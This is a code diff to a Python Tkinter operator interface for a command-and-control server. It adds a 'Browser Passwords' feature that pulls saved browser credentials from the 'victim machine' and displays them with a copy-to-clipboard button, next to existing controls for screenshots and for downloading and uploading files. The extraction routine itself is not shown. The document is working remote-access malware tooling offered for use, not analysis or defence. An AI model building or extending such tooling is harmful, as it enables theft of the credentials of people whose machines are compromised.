@@ -115,13 +115,19 @@ class C2ServerGUI:
                 "var_name": "screenshot_btn"
             },
             {
-                "text": "⬇️ Download File",
+                "text": "Browser Passwords",
+                "desc": "Extract saved passwords from victim's browsers",
+                "command": self.get_browser_passwords,
+                "var_name": "browser_pass_btn"
+            },
+            {
+                "text": "Download File",
                 "desc": "Retrieve file from victim machine",
                 "command": self.download_file,
                 "var_name": "download_btn"
             },
             {
-                "text": "⬆️ Upload File",
+                "text": "Upload File",
                 "desc": "Send file to victim machine",
                 "command": self.upload_file,
                 "var_name": "upload_btn"
@@ -241,6 +247,126 @@ class C2ServerGUI:
                 self.log(f"Geolocation failed for {victim_ip}: {e}", "error")
 
         threading.Thread(target=geolocate_and_show, daemon=True).start()
+
+    def get_browser_passwords(self):
+        """Retrieve and display browser passwords from victim machine"""
+        try:
+            loading_win = tk.Toplevel(self.root)
+            loading_win.title("Extracting Passwords...")
+            loading_win.geometry("300x100")
+            loading_win.transient(self.root)
+            loading_win.grab_set()
+            
+            ttk.Label(
+                loading_win, 
+                text="Extracting saved passwords from browsers...\nThis may take a moment.", 
+                font=("Arial", 10),
+                justify=tk.CENTER
+            ).pack(pady=20)
+            
+            progress = ttk.Progressbar(loading_win, mode='indeterminate')
+            progress.pack(pady=10, fill=tk.X, padx=20)
+            progress.start()
+            loading_win.update()
+            
+            def extract_passwords():
+                try:
+                    # Get passwords from wrapper
+                    passwords = self.c2.get_browser_password()
+                    
+                    # Close loading window
+                    self.root.after(0, loading_win.destroy)
+                    
+                    if not passwords or passwords.strip() == "":
+                        self.root.after(0, lambda: messagebox.showinfo(
+                            "No Passwords Found",
+                            "No saved browser passwords were found on the victim machine."
+                        ))
+                        self.root.after(0, lambda: self.log("No browser passwords found", "info"))
+                        return
+                    
+                    self.root.after(0, lambda: self._show_browser_passwords(passwords))
+                    self.root.after(0, lambda: self.log("Browser passwords extracted successfully", "success"))
+                    
+                except Exception as e:
+                    self.root.after(0, loading_win.destroy)
+                    error_msg = f"Failed to extract passwords: {e}"
+                    self.root.after(0, lambda: messagebox.showerror("Error", error_msg))
+                    self.root.after(0, lambda: self.log(error_msg, "error"))
+            
+            threading.Thread(target=extract_passwords, daemon=True).start()
+            
+        except Exception as e:
+            self.log(f"Browser password error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to retrieve browser passwords:\n{e}")
+
+    def _show_browser_passwords(self, passwords):
+        """Display browser passwords in a new window"""
+        pw_window = tk.Toplevel(self.root)
+        pw_window.title("Browser Passwords")
+        pw_window.geometry("900x600")
+        pw_window.minsize(700, 400)
+        
+        # Main frame
+        main_frame = ttk.Frame(pw_window, padding=10)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Header
+        header_frame = ttk.Frame(main_frame)
+        header_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(
+            header_frame,
+            text="Extracted Browser Passwords",
+            font=("Arial", 12, "bold")
+        ).pack(side=tk.LEFT)
+        
+        # Count passwords
+        password_count = passwords.count("URL:") if "URL:" in passwords else len([l for l in passwords.split('\n') if l.strip()])
+        
+        ttk.Label(
+            header_frame,
+            text=f"Found: {password_count} entries",
+            font=("Arial", 10),
+            foreground="gray"
+        ).pack(side=tk.RIGHT)
+        
+        # Text widget with scrollbar
+        text_frame = ttk.Frame(main_frame)
+        text_frame.pack(fill=tk.BOTH, expand=True)
+        
+        text_widget = scrolledtext.ScrolledText(
+            text_frame,
+            wrap=tk.WORD,
+            font=("Consolas", 10),
+            state=tk.NORMAL
+        )
+        text_widget.pack(fill=tk.BOTH, expand=True)
+        
+        # Insert passwords with formatting
+        text_widget.insert(tk.END, passwords)
+        text_widget.config(state=tk.DISABLED)
+        
+        # Configure tags for better readability
+        text_widget.tag_config("url", foreground="#4A9EFF", font=("Consolas", 10, "bold"))
+        text_widget.tag_config("username", foreground="#50C878")
+        text_widget.tag_config("password", foreground="#FFD700")
+        
+        # Button frame
+        btn_frame = ttk.Frame(main_frame)
+        btn_frame.pack(fill=tk.X, pady=(10, 0))
+
+        def copy_to_clipboard():
+            self.root.clipboard_clear()
+            self.root.clipboard_append(passwords)
+            self.log("Passwords copied to clipboard", "info")
+            messagebox.showinfo("Copied", "Passwords copied to clipboard!")
+        
+        copy_btn = ttk.Button(btn_frame, text="Copy to Clipboard", command=copy_to_clipboard, width=20)
+        copy_btn.pack(side=tk.LEFT, padx=5)
+        
+        close_btn = ttk.Button(btn_frame, text="Close", command=pw_window.destroy, width=20)
+        close_btn.pack(side=tk.LEFT, padx=5)
             
     def log(self, message, level="info"):
         self.log_text.config(state=tk.NORMAL)
@@ -287,6 +413,7 @@ class C2ServerGUI:
         self.download_btn.config(state=tk.NORMAL)
         self.upload_btn.config(state=tk.NORMAL)
         self.location_btn.config(state=tk.NORMAL)
+        self.browser_pass_btn.config(state=tk.NORMAL)
         
         
     def _disable_commands(self):
@@ -296,6 +423,7 @@ class C2ServerGUI:
         self.download_btn.config(state=tk.DISABLED)
         self.upload_btn.config(state=tk.DISABLED)
         self.location_btn.config(state=tk.DISABLED)
+        self.browser_pass_btn.config(state=tk.DISABLED)
         
         
     def stop_server(self):
@@ -396,26 +524,6 @@ class C2ServerGUI:
             
             btn_frame = ttk.Frame(main_frame)
             btn_frame.pack(fill=tk.X, pady=(10, 0))
-            
-            def save_screenshot():
-                file_path = filedialog.asksaveasfilename(
-                    defaultextension=".png",
-                    initialfile=Path(filename).stem,
-                    filetypes=[
-                        ("PNG files", "*.png"),
-                        ("JPEG files", "*.jpg *.jpeg"),
-                        ("BMP files", "*.bmp"),
-                        ("All files", "*.*")
-                    ]
-                )
-                if file_path:
-                    orig_img = Image.open(io.BytesIO(img_data))
-                    orig_img.save(file_path)
-                    self.log(f"Screenshot saved: {file_path}", "success")
-                    messagebox.showinfo("Success", f"Screenshot saved to:\n{file_path}")
-            
-            save_btn = ttk.Button(btn_frame, text="💾 Save As...", command=save_screenshot, width=20)
-            save_btn.pack(side=tk.LEFT, padx=5)
             
             close_btn = ttk.Button(btn_frame, text="✖ Close", command=screenshot_window.destroy, width=20)
             close_btn.pack(side=tk.LEFT, padx=5)
